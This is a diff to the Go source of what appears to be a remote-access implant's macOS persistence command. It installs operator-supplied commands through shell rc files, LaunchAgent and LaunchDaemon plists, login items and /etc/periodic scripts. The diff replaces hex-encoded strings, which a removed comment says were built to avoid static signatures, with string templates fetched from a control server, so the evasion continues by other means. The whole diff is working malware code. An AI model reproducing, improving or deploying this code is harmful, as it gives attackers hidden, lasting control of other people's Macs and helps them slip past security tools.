@@ -6,6 +6,8 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/user"
@@ -16,92 +18,121 @@ import (
 	"time"
 )
 
-// Persistence strings (constructed to avoid static signatures)
-var (
-	// Method names
-	pMethodRC       = string([]byte{0x72, 0x63})                                                                         // rc
-	pMethodLaunch   = string([]byte{0x6c, 0x61, 0x75, 0x6e, 0x63, 0x68})                                                 // launch
-	pMethodLogin    = string([]byte{0x6c, 0x6f, 0x67, 0x69, 0x6e})                                                       // login
-	pMethodPeriodic = string([]byte{0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63})                                     // periodic
+// Template indices for Darwin persistence - must match server's persistence.go
+const (
+	// Method names (220-223)
+	idxDarwinMethodRC       = 220
+	idxDarwinMethodLaunch   = 221
+	idxDarwinMethodLogin    = 222
+	idxDarwinMethodPeriodic = 223
 
-	// Flag arguments
-	pFlagUser      = string([]byte{0x2d, 0x2d, 0x75, 0x73, 0x65, 0x72})                                                   // --user
-	pFlagCommand   = string([]byte{0x2d, 0x2d, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64})                                 // --command
-	pFlagFiles     = string([]byte{0x2d, 0x2d, 0x66, 0x69, 0x6c, 0x65, 0x73})                                             // --files
-	pFlagName      = string([]byte{0x2d, 0x2d, 0x6e, 0x61, 0x6d, 0x65})                                                   // --name
-	pFlagSystem    = string([]byte{0x2d, 0x2d, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d})                                       // --system
-	pFlagInterval  = string([]byte{0x2d, 0x2d, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x76, 0x61, 0x6c})                           // --interval
-	pFlagPath      = string([]byte{0x2d, 0x2d, 0x70, 0x61, 0x74, 0x68})                                                   // --path
-	pFlagFrequency = string([]byte{0x2d, 0x2d, 0x66, 0x72, 0x65, 0x71, 0x75, 0x65, 0x6e, 0x63, 0x79})                     // --frequency
+	// Flag arguments (224-231)
+	idxDarwinFlagUser      = 224
+	idxDarwinFlagCommand   = 225
+	idxDarwinFlagFiles     = 226
+	idxDarwinFlagName      = 227
+	idxDarwinFlagSystem    = 228
+	idxDarwinFlagInterval  = 229
+	idxDarwinFlagPath      = 230
+	idxDarwinFlagFrequency = 231
 
-	// RC file names
-	pRCZshrc       = string([]byte{0x2e, 0x7a, 0x73, 0x68, 0x72, 0x63})                                                   // .zshrc
-	pRCBashProfile = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x5f, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})         // .bash_profile
-	pRCBashrc      = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x72, 0x63})                                             // .bashrc
-	pRCProfile     = string([]byte{0x2e, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})                                       // .profile
+	// RC file names (232-235)
+	idxDarwinRCZshrc       = 232
+	idxDarwinRCBashProfile = 233
+	idxDarwinRCBashrc      = 234
+	idxDarwinRCProfile     = 235
 
-	// Path prefix
-	pHomeTilde = string([]byte{0x7e, 0x2f}) // ~/
+	// Path prefix (236)
+	idxDarwinHomeTilde = 236
 
-	// LaunchAgent/Daemon paths
-	pLaunchDaemonsPath = string([]byte{0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f, 0x4c, 0x61, 0x75, 0x6e, 0x63, 0x68, 0x44, 0x61, 0x65, 0x6d, 0x6f, 0x6e, 0x73, 0x2f}) // /Library/LaunchDaemons/
-	pLaunchAgentsPath  = string([]byte{0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f, 0x4c, 0x61, 0x75, 0x6e, 0x63, 0x68, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x73})                     // Library/LaunchAgents
-	pPlistExt          = string([]byte{0x2e, 0x70, 0x6c, 0x69, 0x73, 0x74})                                                                                                         // .plist
+	// LaunchAgent/Daemon paths (237-239)
+	idxDarwinLaunchDaemonsPath = 237
+	idxDarwinLaunchAgentsPath  = 238
+	idxDarwinPlistExt          = 239
 
-	// Frequency values
-	pFreqDaily   = string([]byte{0x64, 0x61, 0x69, 0x6c, 0x79})                                                           // daily
-	pFreqWeekly  = string([]byte{0x77, 0x65, 0x65, 0x6b, 0x6c, 0x79})                                                     // weekly
-	pFreqMonthly = string([]byte{0x6d, 0x6f, 0x6e, 0x74, 0x68, 0x6c, 0x79})                                               // monthly
+	// Frequency values (240-242)
+	idxDarwinFreqDaily   = 240
+	idxDarwinFreqWeekly  = 241
+	idxDarwinFreqMonthly = 242
 
-	// Periodic directories
-	pPeriodicDaily   = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63, 0x2f, 0x64, 0x61, 0x69, 0x6c, 0x79})     // /etc/periodic/daily
-	pPeriodicWeekly  = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63, 0x2f, 0x77, 0x65, 0x65, 0x6b, 0x6c, 0x79}) // /etc/periodic/weekly
-	pPeriodicMonthly = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63, 0x2f, 0x6d, 0x6f, 0x6e, 0x74, 0x68, 0x6c, 0x79}) // /etc/periodic/monthly
+	// Periodic directories (243-245)
+	idxDarwinPeriodicDaily   = 243
+	idxDarwinPeriodicWeekly  = 244
+	idxDarwinPeriodicMonthly = 245
 
-	// Plist template components - headers
-	pTmplName  = string([]byte{0x70, 0x6c, 0x69, 0x73, 0x74})                                                                                                                                                                                                                                             // plist
-	pXMLHeader = string([]byte{0x3c, 0x3f, 0x78, 0x6d, 0x6c, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x22, 0x31, 0x2e, 0x30, 0x22, 0x20, 0x65, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3d, 0x22, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x22, 0x3f, 0x3e})                                       // <?xml version="1.0" encoding="UTF-8"?>
-	pDTDLine   = string([]byte{0x3c, 0x21, 0x44, 0x4f, 0x43, 0x54, 0x59, 0x50, 0x45, 0x20, 0x70, 0x6c, 0x69, 0x73, 0x74, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x22, 0x2d, 0x2f, 0x2f, 0x41, 0x70, 0x70, 0x6c, 0x65, 0x2f, 0x2f, 0x44, 0x54, 0x44, 0x20, 0x50, 0x4c, 0x49, 0x53, 0x54, 0x20, 0x31, 0x2e, 0x30, 0x2f, 0x2f, 0x45, 0x4e, 0x22, 0x20, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x77, 0x77, 0x77, 0x2e, 0x61, 0x70, 0x70, 0x6c, 0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x44, 0x54, 0x44, 0x73, 0x2f, 0x50, 0x72, 0x6f, 0x70, 0x65, 0x72, 0x74, 0x79, 0x4c, 0x69, 0x73, 0x74, 0x2d, 0x31, 0x2e, 0x30, 0x2e, 0x64, 0x74, 0x64, 0x22, 0x3e}) // <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+	// Plist template components (246-248)
+	idxDarwinTmplName  = 246
+	idxDarwinXMLHeader = 247
+	idxDarwinDTDLine   = 248
 
-	// Plist key names
-	pKeyLabel    = string([]byte{0x4c, 0x61, 0x62, 0x65, 0x6c})                                                                         // Label
-	pKeyProgArgs = string([]byte{0x50, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x41, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73})       // ProgramArguments
-	pKeyRunAtLd  = string([]byte{0x52, 0x75, 0x6e, 0x41, 0x74, 0x4c, 0x6f, 0x61, 0x64})                                                 // RunAtLoad
-	pKeyStartInt = string([]byte{0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x76, 0x61, 0x6c})                         // StartInterval
-	pKeyStdOut   = string([]byte{0x53, 0x74, 0x61, 0x6e, 0x64, 0x61, 0x72, 0x64, 0x4f, 0x75, 0x74, 0x50, 0x61, 0x74, 0x68})             // StandardOutPath
-	pKeyStdErr   = string([]byte{0x53, 0x74, 0x61, 0x6e, 0x64, 0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6f, 0x72, 0x50, 0x61, 0x74, 0x68}) // StandardErrorPath
-	pTmpPath     = string([]byte{0x2f, 0x74, 0x6d, 0x70, 0x2f})                                                                         // /tmp/
+	// Plist key names (249-255)
+	idxDarwinKeyLabel    = 249
+	idxDarwinKeyProgArgs = 250
+	idxDarwinKeyRunAtLd  = 251
+	idxDarwinKeyStartInt = 252
+	idxDarwinKeyStdOut   = 253
+	idxDarwinKeyStdErr   = 254
+	idxDarwinTmpPath     = 255
 
-	// XML tag components
-	xO       = string([]byte{0x3c})                               // <
-	xC       = string([]byte{0x3e})                               // >
-	xCO      = string([]byte{0x3c, 0x2f})                         // </
-	xSC      = string([]byte{0x2f, 0x3e})                         // />
-	xDict    = string([]byte{0x64, 0x69, 0x63, 0x74})             // dict
-	xKey     = string([]byte{0x6b, 0x65, 0x79})                   // key
-	xStr     = string([]byte{0x73, 0x74, 0x72, 0x69, 0x6e, 0x67}) // string
-	xArr     = string([]byte{0x61, 0x72, 0x72, 0x61, 0x79})       // array
-	xInt     = string([]byte{0x69, 0x6e, 0x74, 0x65, 0x67, 0x65, 0x72})             // integer
-	xTrue    = string([]byte{0x74, 0x72, 0x75, 0x65})                               // true
-	xVer     = string([]byte{0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x22, 0x31, 0x2e, 0x30, 0x22}) //  version="1.0"
-	xOutExt  = string([]byte{0x2e, 0x6f, 0x75, 0x74})             // .out
-	xErrExt  = string([]byte{0x2e, 0x65, 0x72, 0x72})             // .err
+	// XML tag components (256-268)
+	idxDarwinXO       = 256
+	idxDarwinXC       = 257
+	idxDarwinXCO      = 258
+	idxDarwinXSC      = 259
+	idxDarwinXDict    = 260
+	idxDarwinXKey     = 261
+	idxDarwinXStr     = 262
+	idxDarwinXArr     = 263
+	idxDarwinXInt     = 264
+	idxDarwinXTrue    = 265
+	idxDarwinXVer     = 266
+	idxDarwinXOutExt  = 267
+	idxDarwinXErrExt  = 268
 
-	// Periodic script components
-	pScriptPrefix = string([]byte{0x39, 0x39, 0x39, 0x2e})                                     // 999.
-	pShebang      = string([]byte{0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68})       // #!/bin/sh
-	pExitZero     = string([]byte{0x65, 0x78, 0x69, 0x74, 0x20, 0x30})                         // exit 0
-	pPeriodic     = string([]byte{0x50, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63})             // Periodic
-	pTask         = string([]byte{0x74, 0x61, 0x73, 0x6b})                                     // task
+	// Periodic script components (269-273)
+	idxDarwinScriptPrefix = 269
+	idxDarwinShebang      = 270
+	idxDarwinExitZero     = 271
+	idxDarwinPeriodic     = 272
+	idxDarwinTask         = 273
 
-	// Command name
-	pCmdName = string([]byte{0x70, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74}) // persist
+	// Command name (274)
+	idxDarwinCmdName = 274
 )
+
+// DarwinPersistTemplate stores the persistence template received from server
+type DarwinPersistTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
+
+// Global template storage
+var globalDarwinPersistTpl *DarwinPersistTemplate
+
+// pTpl safely retrieves a Darwin persistence template string by index
+func pTpl(idx int) string {
+	if globalDarwinPersistTpl != nil && globalDarwinPersistTpl.Templates != nil && idx < len(globalDarwinPersistTpl.Templates) {
+		return globalDarwinPersistTpl.Templates[idx]
+	}
+	return ""
+}
 
 // PersistenceCommand handles various persistence methods on macOS
 type PersistenceCommand struct{}
 
 func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+	// Parse template from Command.Data - required for operation
+	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
+			var pt DarwinPersistTemplate
+			if err := json.Unmarshal(decoded, &pt); err == nil {
+				globalDarwinPersistTpl = &pt
+			}
+		}
+	}
+
 	if len(args) < 1 {
 		return CommandResult{
 			Output:   Err(E1),
@@ -111,13 +142,13 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 
 	method := args[0]
 	switch method {
-	case pMethodRC:
+	case pTpl(idxDarwinMethodRC):
 		return c.handleRCPersistence(args[1:])
-	case pMethodLaunch:
+	case pTpl(idxDarwinMethodLaunch):
 		return c.handleLaunchPersistence(args[1:])
-	case pMethodLogin:
+	case pTpl(idxDarwinMethodLogin):
 		return c.handleLoginItemPersistence(args[1:])
-	case pMethodPeriodic:
+	case pTpl(idxDarwinMethodPeriodic):
 		return c.handlePeriodicPersistence(args[1:])
 	default:
 		return CommandResult{
@@ -136,17 +167,17 @@ func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
 	// Parse arguments (maintaining Linux compatibility)
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case pFlagUser:
+		case pTpl(idxDarwinFlagUser):
 			if i+1 < len(args) {
 				targetUser = args[i+1]
 				i++
 			}
-		case pFlagCommand:
+		case pTpl(idxDarwinFlagCommand):
 			if i+1 < len(args) {
 				command = args[i+1]
 				i++
 			}
-		case pFlagFiles:
+		case pTpl(idxDarwinFlagFiles):
 			if i+1 < len(args) {
 				targetFiles = strings.Split(args[i+1], ",")
 				i++
@@ -180,15 +211,15 @@ func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
 	// If no files specified, use macOS defaults
 	if len(targetFiles) == 0 {
 		targetFiles = []string{
-			filepath.Join(u.HomeDir, pRCZshrc),       // Default shell on modern macOS
-			filepath.Join(u.HomeDir, pRCBashProfile), // Bash on macOS uses .bash_profile
-			filepath.Join(u.HomeDir, pRCBashrc),      // Some users might have this
-			filepath.Join(u.HomeDir, pRCProfile),    // Generic profile
+			filepath.Join(u.HomeDir, pTpl(idxDarwinRCZshrc)),       // Default shell on modern macOS
+			filepath.Join(u.HomeDir, pTpl(idxDarwinRCBashProfile)), // Bash on macOS uses .bash_profile
+			filepath.Join(u.HomeDir, pTpl(idxDarwinRCBashrc)),      // Some users might have this
+			filepath.Join(u.HomeDir, pTpl(idxDarwinRCProfile)),    // Generic profile
 		}
 	} else {
 		// Expand paths for specified files
 		for i, file := range targetFiles {
-			if strings.HasPrefix(file, pHomeTilde) {
+			if strings.HasPrefix(file, pTpl(idxDarwinHomeTilde)) {
 				targetFiles[i] = filepath.Join(u.HomeDir, file[2:])
 			} else if !filepath.IsAbs(file) {
 				targetFiles[i] = filepath.Join(u.HomeDir, file)
@@ -261,21 +292,21 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 	// Parse arguments
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case pFlagName:
+		case pTpl(idxDarwinFlagName):
 			if i+1 < len(args) {
 				serviceName = args[i+1]
 				i++
 			}
-		case pFlagCommand:
+		case pTpl(idxDarwinFlagCommand):
 			if i+1 < len(args) {
 				command = args[i+1]
 				i++
 			}
-		case pFlagSystem:
+		case pTpl(idxDarwinFlagSystem):
 			isSystem = true
-		case pFlagUser:
+		case pTpl(idxDarwinFlagUser):
 			isSystem = false
-		case pFlagInterval:
+		case pTpl(idxDarwinFlagInterval):
 			if i+1 < len(args) {
 				if val, err := strconv.Atoi(args[i+1]); err == nil {
 					interval = val
@@ -295,7 +326,7 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 	// Determine installation path
 	var plistPath string
 	if isSystem {
-		plistPath = pLaunchDaemonsPath + serviceName + pPlistExt
+		plistPath = pTpl(idxDarwinLaunchDaemonsPath) + serviceName + pTpl(idxDarwinPlistExt)
 	} else {
 		u, err := user.Current()
 		if err != nil {
@@ -304,7 +335,7 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 				ExitCode: 1,
 			}
 		}
-		plistPath = filepath.Join(u.HomeDir, pLaunchAgentsPath, serviceName+pPlistExt)
+		plistPath = filepath.Join(u.HomeDir, pTpl(idxDarwinLaunchAgentsPath), serviceName+pTpl(idxDarwinPlistExt))
 	}
 
 	// Create plist content
@@ -341,26 +372,26 @@ func (c *PersistenceCommand) generateLaunchPlist(label, command string, interval
 	args := cmdParts[1:]
 
 	// Helper functions to build XML tags from components
-	tag := func(name string) string { return xO + name + xC }
-	ctag := func(name string) string { return xCO + name + xC }
-	stag := func(name string) string { return xO + name + xSC }
-	kv := func(k, v string) string { return "    " + tag(xKey) + k + ctag(xKey) + "\n    " + v + "\n" }
+	tag := func(name string) string { return pTpl(idxDarwinXO) + name + pTpl(idxDarwinXC) }
+	ctag := func(name string) string { return pTpl(idxDarwinXCO) + name + pTpl(idxDarwinXC) }
+	stag := func(name string) string { return pTpl(idxDarwinXO) + name + pTpl(idxDarwinXSC) }
+	kv := func(k, v string) string { return "    " + tag(pTpl(idxDarwinXKey)) + k + ctag(pTpl(idxDarwinXKey)) + "\n    " + v + "\n" }
 
 	// Build plist template from hex components
-	plistTemplate := pXMLHeader + "\n" +
-		pDTDLine + "\n" +
-		xO + pTmplName + xVer + xC + "\n" +
-		tag(xDict) + "\n" +
-		kv(pKeyLabel, tag(xStr)+"{{.Label}}"+ctag(xStr)) +
-		kv(pKeyProgArgs, tag(xArr)+"\n        "+tag(xStr)+"{{.Program}}"+ctag(xStr)+"\n        {{range .Args}}"+tag(xStr)+"{{.}}"+ctag(xStr)+"\n        {{end}}\n    "+ctag(xArr)) +
-		kv(pKeyRunAtLd, stag(xTrue)) +
-		kv(pKeyStartInt, tag(xInt)+"{{.Interval}}"+ctag(xInt)) +
-		kv(pKeyStdOut, tag(xStr)+pTmpPath+"{{.Label}}"+xOutExt+ctag(xStr)) +
-		kv(pKeyStdErr, tag(xStr)+pTmpPath+"{{.Label}}"+xErrExt+ctag(xStr)) +
-		ctag(xDict) + "\n" +
-		xCO + pTmplName + xC
+	plistTemplate := pTpl(idxDarwinXMLHeader) + "\n" +
+		pTpl(idxDarwinDTDLine) + "\n" +
+		pTpl(idxDarwinXO) + pTpl(idxDarwinTmplName) + pTpl(idxDarwinXVer) + pTpl(idxDarwinXC) + "\n" +
+		tag(pTpl(idxDarwinXDict)) + "\n" +
+		kv(pTpl(idxDarwinKeyLabel), tag(pTpl(idxDarwinXStr))+"{{.Label}}"+ctag(pTpl(idxDarwinXStr))) +
+		kv(pTpl(idxDarwinKeyProgArgs), tag(pTpl(idxDarwinXArr))+"\n        "+tag(pTpl(idxDarwinXStr))+"{{.Program}}"+ctag(pTpl(idxDarwinXStr))+"\n        {{range .Args}}"+tag(pTpl(idxDarwinXStr))+"{{.}}"+ctag(pTpl(idxDarwinXStr))+"\n        {{end}}\n    "+ctag(pTpl(idxDarwinXArr))) +
+		kv(pTpl(idxDarwinKeyRunAtLd), stag(pTpl(idxDarwinXTrue))) +
+		kv(pTpl(idxDarwinKeyStartInt), tag(pTpl(idxDarwinXInt))+"{{.Interval}}"+ctag(pTpl(idxDarwinXInt))) +
+		kv(pTpl(idxDarwinKeyStdOut), tag(pTpl(idxDarwinXStr))+pTpl(idxDarwinTmpPath)+"{{.Label}}"+pTpl(idxDarwinXOutExt)+ctag(pTpl(idxDarwinXStr))) +
+		kv(pTpl(idxDarwinKeyStdErr), tag(pTpl(idxDarwinXStr))+pTpl(idxDarwinTmpPath)+"{{.Label}}"+pTpl(idxDarwinXErrExt)+ctag(pTpl(idxDarwinXStr))) +
+		ctag(pTpl(idxDarwinXDict)) + "\n" +
+		pTpl(idxDarwinXCO) + pTpl(idxDarwinTmplName) + pTpl(idxDarwinXC)
 
-	tmpl, _ := template.New(pTmplName).Parse(plistTemplate)
+	tmpl, _ := template.New(pTpl(idxDarwinTmplName)).Parse(plistTemplate)
 	var buf bytes.Buffer
 	tmpl.Execute(&buf, struct {
 		Label    string
@@ -384,12 +415,12 @@ func (c *PersistenceCommand) handleLoginItemPersistence(args []string) CommandRe
 
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case pFlagName:
+		case pTpl(idxDarwinFlagName):
 			if i+1 < len(args) {
 				itemName = args[i+1]
 				i++
 			}
-		case pFlagPath:
+		case pTpl(idxDarwinFlagPath):
 			if i+1 < len(args) {
 				appPath = args[i+1]
 				i++
@@ -417,12 +448,12 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case pFlagCommand:
+		case pTpl(idxDarwinFlagCommand):
 			if i+1 < len(args) {
 				command = args[i+1]
 				i++
 			}
-		case pFlagFrequency:
+		case pTpl(idxDarwinFlagFrequency):
 			if i+1 < len(args) {
 				frequency = args[i+1]
 				i++
@@ -440,12 +471,12 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 	// Determine periodic directory
 	var periodicDir string
 	switch frequency {
-	case pFreqDaily:
-		periodicDir = pPeriodicDaily
-	case pFreqWeekly:
-		periodicDir = pPeriodicWeekly
-	case pFreqMonthly:
-		periodicDir = pPeriodicMonthly
+	case pTpl(idxDarwinFreqDaily):
+		periodicDir = pTpl(idxDarwinPeriodicDaily)
+	case pTpl(idxDarwinFreqWeekly):
+		periodicDir = pTpl(idxDarwinPeriodicWeekly)
+	case pTpl(idxDarwinFreqMonthly):
+		periodicDir = pTpl(idxDarwinPeriodicMonthly)
 	default:
 		return CommandResult{
 			Output:   ErrCtx(E22, frequency),
@@ -454,11 +485,11 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 	}
 
 	// Generate script name
-	scriptName := pScriptPrefix + strings.Replace(command[:10], " ", "_", -1)
+	scriptName := pTpl(idxDarwinScriptPrefix) + strings.Replace(command[:10], " ", "_", -1)
 	scriptPath := filepath.Join(periodicDir, scriptName)
 
 	// Create script content (used for reference, written by caller)
-	_ = pShebang + "\n#\n# " + pPeriodic + " " + frequency + " " + pTask + "\n#\n\n" + command + "\n\n" + pExitZero + "\n"
+	_ = pTpl(idxDarwinShebang) + "\n#\n# " + pTpl(idxDarwinPeriodic) + " " + frequency + " " + pTpl(idxDarwinTask) + "\n#\n\n" + command + "\n\n" + pTpl(idxDarwinExitZero) + "\n"
 
 	return CommandResult{
 		Output:      SuccCtx(S1, scriptPath),
